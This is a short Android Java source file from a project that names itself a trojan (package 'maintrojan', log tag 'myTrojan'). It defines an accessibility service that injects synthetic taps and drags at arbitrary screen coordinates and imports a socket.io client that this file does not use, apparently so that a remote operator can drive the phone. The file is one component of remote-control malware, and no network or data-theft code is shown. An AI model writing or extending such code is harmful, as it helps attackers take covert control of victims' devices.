package com.example.maintrojan;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import androidx.annotation.RequiresApi;

import io.socket.client.Socket;

public class ClickEvt extends AccessibilityService {
    private  final String TAG = "myTrojan";
    @RequiresApi(api = Build.VERSION_CODES.N)
    public  void  click(float x, float y){
        Log.d(TAG, "dispatching event click "+x+" "+y);
        Path p = new Path();
        p.moveTo(x,y);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(p,0,50));
        dispatchGesture(builder.build(),null,null);
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    public  void  drag(float x1, float y1,float x2,float y2){
        Log.d(TAG, "dispatching event drag "+x1+" "+y1+" "+x2+" "+y2);
        Path p = new Path();
        p.moveTo(x1,y1);
        p.lineTo(x2,y2);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(p,0,100));
        dispatchGesture(builder.build(),null,null);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {

    }

    @Override
    public void onInterrupt() {

    }
}
